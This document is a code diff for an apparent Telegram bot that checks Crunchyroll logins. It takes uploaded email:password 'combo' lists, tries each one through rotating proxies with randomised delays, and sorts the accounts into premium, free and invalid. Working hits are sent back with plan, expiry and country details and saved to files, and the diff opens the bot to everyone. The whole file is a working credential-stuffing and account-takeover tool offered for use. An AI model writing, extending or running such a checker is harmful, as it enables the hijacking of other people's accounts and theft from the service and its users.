@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import asyncio
 import uuid
@@ -6,10 +5,11 @@ import random
 import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
-from aiogram import F
 from aiogram.types import FSInputFile
+from aiogram import F
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+AUTHORIZED_USERS = []  # Allow everyone
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -18,7 +18,6 @@ checker = None
 proxies = []
 stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}
 
-RATE_DELAY = 1.8
 
 class CrunchyrollChecker:
     def __init__(self, proxies=None):
@@ -170,9 +169,6 @@ class CrunchyrollChecker:
 
 
 async def send_result(chat_id, result):
-    if result['status'] not in ['PREMIUM', 'FREE']:
-        return
-
     capture = f"""
 {'='*70}
 EMAIL: {result['email']}
@@ -188,80 +184,104 @@ EXPIRY: {result.get('expiry', 'N/A')}
 PLAN DURATION: {result.get('plan_duration', 'N/A')}
 ACTIVE: {result.get('active', 'N/A')}
 COUNTRY: {result.get('country', 'N/A')}
-CHECKED BY: @Sudhakaran12
+CHECKED BY: @Cr_chker001_bot
 {'='*70}
 """
 
-    with open("hits.txt", "a", encoding="utf-8") as f:
-        f.write(capture + "\n")
+    if result['status'] == 'PREMIUM':
+        await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
+        with open("hits.txt", "a", encoding="utf-8") as f:
+            f.write(capture + "\n")
+
+    elif result['status'] == 'FREE':
+        await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
+        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
+            f.write(capture + "\n")
+
+    else:
+        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
+
+
+@dp.message(Command("start"))
+async def start(message: types.Message):
+    await message.answer(
+        "Crunchyroll premium checker\n\n"
+        "Bot made by @Sudhakaran12\n\n"
+        "📌 Features:\n"
+        "• Upload Combos.txt file (email:password format)\n"
+        "• Or paste combos directly\n"
+        "• Use /check to check accounts\n"
+        "• /proxies to load proxy file\n"
+        "• Fast mode with proxy rotation\n"
+        "• Premium & Free hits saved with full details"
+    )
+
+
+@dp.message(Command("proxies"))
+async def proxies_cmd(message: types.Message):
+    await message.answer("📤 Send your proxy file (.txt) or paste proxies (one per line)")
 
 
 @dp.message(F.document | F.text)
 async def handle(message: types.Message):
     global checker
 
+    # Proxy loading - ONLY when /proxies command is used
     if message.text and message.text.startswith("/proxies"):
         if message.document:
             file = await bot.get_file(message.document.file_id)
             content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
         else:
             content = message.text.replace("/proxies", "").strip()
+
         global proxies
         proxies = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
+    # Combo checking
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
     else:
-        content = message.text
+        content = message.text.replace("/check", "").strip()
 
     lines = []
     for raw in content.splitlines():
         raw = raw.strip()
-        if not raw or ':' not in raw:
+        if not raw:
             continue
-        if '@' in raw:
+        if ':' in raw and '@' in raw:
             part = raw.split(':', 1)
             if len(part) == 2 and '@' in part[0]:
-                email = part[0].strip()
-                password = part[1].split()[0].strip()
-                lines.append(email + ":" + password)
+                email_part = part[0].strip()
+                pass_part = part[1].split()[0].strip()
+                lines.append(email_part + ":" + pass_part)
 
     if not lines:
         return await message.answer("No valid email:password found.")
 
-    open("hits.txt", "w").close()
+    await message.answer(f"🚀 Checking {len(lines)} combos... (fast mode)")
 
-    checker = CrunchyrollChecker(proxies)
+    for line in lines:
+        try:
+            email, password = line.split(":", 1)
+            result = checker.check(email.strip(), password.strip())
 
-    total = len(lines)
-    progress_msg = await message.answer("Processing 0%")
+            stats['checked'] += 1
+            if result['status'] == 'PREMIUM':
+                stats['premium'] += 1
+            elif result['status'] == 'FREE':
+                stats['free'] += 1
+            else:
+                stats['invalid'] += 1
 
-    for i, line in enumerate(lines, 1):
-        email, password = line.split(":", 1)
-        percentage = int((i / total) * 100)
-        await progress_msg.edit_text(f"Processing {percentage}%")
+            await send_result(message.from_user.id, result)
 
-        result = checker.check(email.strip(), password.strip())
+            await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))
 
-        stats['checked'] += 1
-        if result['status'] == 'PREMIUM':
-            stats['premium'] += 1
-        elif result['status'] == 'FREE':
-            stats['free'] += 1
-        else:
-            stats['invalid'] += 1
-
-        await send_result(message.from_user.id, result)
-
-        await asyncio.sleep(RATE_DELAY)
-
-    if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
-        await message.answer_document(FSInputFile("hits.txt"), caption="✅ Here are all FREE + PREMIUM accounts with full details")
-    else:
-        await message.answer("No FREE or PREMIUM accounts found.")
+        except:
+            continue
 
 
 async def main():
@@ -273,3 +293,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+    
